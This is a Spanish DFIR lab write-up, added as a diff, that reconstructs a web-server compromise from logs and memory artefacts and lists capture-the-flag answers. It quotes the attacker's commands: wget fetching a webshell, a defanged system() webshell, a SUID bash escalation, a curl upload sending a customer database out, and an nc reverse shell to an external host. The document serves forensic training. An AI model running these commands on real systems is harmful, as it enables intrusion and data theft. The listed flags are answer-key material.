@@ -1,0 +1,107 @@
+Hallazgos de la investigación — Lab 11 (DFIR)
+Sistema: phantomcorp-web (10.0.0.5) · Atacante: 185.220.101.42
+
+====================================================================
+R1 · Vector de entrada (SQLi -> RCE)
+====================================================================
+$ grep -n "api/reporte" labs/lab11-forensia/caso/logs/access.log
+18:185.220.101.42 - - [05/Sep/2026:02:18:10 +0000] "GET /api/reporte?token=phantom-api-7c1e&cmd=id HTTP/1.1" 200 60 "-" "curl/8.5"
+19:185.220.101.42 - - [05/Sep/2026:02:18:33 +0000] "GET /api/reporte?token=phantom-api-7c1e&cmd=echo%20FLAG%7Bdfir_vector_sqli%7D%20%3E%20/tmp/.p HTTP/1.1" 200 12 "-" "curl/8.5"
+20:185.220.101.42 - - [05/Sep/2026:02:19:02 +0000] "GET /api/reporte?token=phantom-api-7c1e&cmd=wget%20http://45.13.37.7/s.php%20-O%20/var/www/uploads/shell.php HTTP/1.1" 200 5 "-" "curl/8.5"
+
+Decodificación del payload de la línea 19:
+  echo%20FLAG%7Bdfir_vector_sqli%7D%20%3E%20/tmp/.p
+  -> echo FLAG{dfir_vector_sqli} > /tmp/.p
+
+El token phantom-api-7c1e se obtuvo de /backup/rrhh.conf (access.log:17).
+El RCE se confirma con el comando id (access.log:18) y con la escritura
+de /tmp/.p, que el disco fecha a las 02:18 (disco/listado.txt:3).
+
+FLAG: FLAG{dfir_vector_sqli}
+
+====================================================================
+R2 · Webshell dropeada en el disco
+====================================================================
+$ cat labs/lab11-forensia/caso/disco/var/www/uploads/shell.php.evidencia.txt
+=== CAPTURA DE EVIDENCIA — /var/www/uploads/shell.php ===
+Webshell hallada en el disco. Contenido DEFANGEADO (neutralizado) para manejo
+forense seguro. NO reconstruir ni ejecutar.
+
+  <?php
+  // webshell dropeada por el atacante (wget desde 45.13.37.7)
+  // FLAG{dfir_webshell_hallado}
+  if (isset($_GET['c'])) { sys'tem($_GET['c']); }   // <- RCE via ?c= (defangeado)
+  // persistencia: se relanza por cron cada 5 min (ver /etc/cron.d/phantom-maint)
+  ?>
+
+Hash SHA-256 del archivo original (registrado en la custodia): ver evidencia.sha256
+
+Correlación:
+  - disco/listado.txt:4  -> /var/www/uploads/shell.php creado a las 02:19
+  - access.log:20        -> wget del archivo desde 45.13.37.7 a las 02:19:02
+  - access.log:21        -> primer uso de la webshell (?c=whoami) a las 02:19:48
+  - memoria/netstat.txt:5 -> conexión wget a 45.13.37.7:80 en TIME_WAIT (PID 1201)
+
+FLAG: FLAG{dfir_webshell_hallado}
+
+====================================================================
+R3 · Escalada de privilegios (SUID)
+====================================================================
+$ grep -n "system-check" labs/lab11-forensia/caso/memoria/bash_history.txt \
+    labs/lab11-forensia/caso/memoria/pslist.txt \
+    labs/lab11-forensia/caso/memoria/lsof.txt \
+    labs/lab11-forensia/caso/logs/auth.log \
+    labs/lab11-forensia/caso/disco/listado.txt
+bash_history.txt:6:/usr/local/bin/system-check -p -c 'id'
+bash_history.txt:7:echo FLAG{dfir_privesc_suid}
+pslist.txt:8:1477  1240  root      system-check    <- SUID root (escalada); euid=0
+lsof.txt:4:1477  system-check  txt   REG    /usr/local/bin/system-check
+auth.log:4:Sep  5 02:21:04 phantomcorp-web kernel: [ 8823.11] audit: SUID exec /usr/local/bin/system-check uid=33 euid=0
+listado.txt:5:2026-09-05 02:21  1113504 /usr/local/bin/system-check      (SUID root - copia de bash)
+
+Cadena: www-data ejecuta el binario SUID system-check (copia de bash con
+bit SUID root), que le da euid=0. El proceso queda vivo con PID 1477 y es
+padre del nc que abre el C2 (pslist.txt:9).
+
+FLAG: FLAG{dfir_privesc_suid}
+
+====================================================================
+R4 · C2 y exfiltración
+====================================================================
+$ grep -n "45.13.37.7" labs/lab11-forensia/caso/memoria/bash_history.txt \
+    labs/lab11-forensia/caso/memoria/netstat.txt \
+    labs/lab11-forensia/caso/memoria/pslist.txt \
+    labs/lab11-forensia/caso/memoria/lsof.txt
+bash_history.txt:4:wget http://45.13.37.7/s.php -O /var/www/uploads/shell.php
+bash_history.txt:8:tar czf /tmp/.exfil/clientes.tar.gz /app/priv/clientes.db.txt
+bash_history.txt:9:curl -s -F "f=@/tmp/.exfil/clientes.tar.gz" http://45.13.37.7/upload?tag=FLAG{dfir_c2_exfil}
+netstat.txt:4:tcp   10.0.0.5:41022        45.13.37.7:4444     ESTABLISHED  1490  nc        <- C2 saliente
+netstat.txt:5:tcp   10.0.0.5:41108        45.13.37.7:80       TIME_WAIT    1201  wget      <- descarga del webshell
+pslist.txt:9:1490  1477  root      nc 45.13.37.7 4444   <- reverse shell / C2
+lsof.txt:3:1490  nc            3u    IPv4   10.0.0.5:41022->45.13.37.7:4444
+
+Exfiltración: se empaqueta /app/priv/clientes.db.txt en
+/tmp/.exfil/clientes.tar.gz (48.210 bytes, disco/listado.txt:7) y se sube
+por curl al mismo host externo. El tamaño coincide con la lectura del
+archivo por la webshell (access.log:22, respuesta de 48.210 bytes).
+
+FLAG: FLAG{dfir_c2_exfil}
+
+====================================================================
+R5 · Cadena de custodia: evidencia alterada
+====================================================================
+Ver salida completa en evidencia/custodia.txt.
+
+  logs/auth.log: FAILED
+  Hash registrado: 0000decafbad0000f1e2d3c4b5a6978800112233445566778899aabbccddeeff
+  Hash calculado:  7d18039d128d0df7a245ca02f469ea02cd1d4f205a24fb33c5bcf7041b66e9ab
+
+El propio archivo contiene las líneas 5-8 que documentan la edición
+posterior a la captura y el marcador recuperado del journal:
+
+  auth.log:5:# --- lineas eliminadas por el atacante ---
+  auth.log:6:# nota del forense: el hash de este archivo NO coincide con el de la custodia.
+  auth.log:7:# alguien lo edito despues de la captura. marcador recuperado del journal:
+  auth.log:8:# FLAG{dfir_custodia_alterada}
+
+FLAG: FLAG{dfir_custodia_alterada}
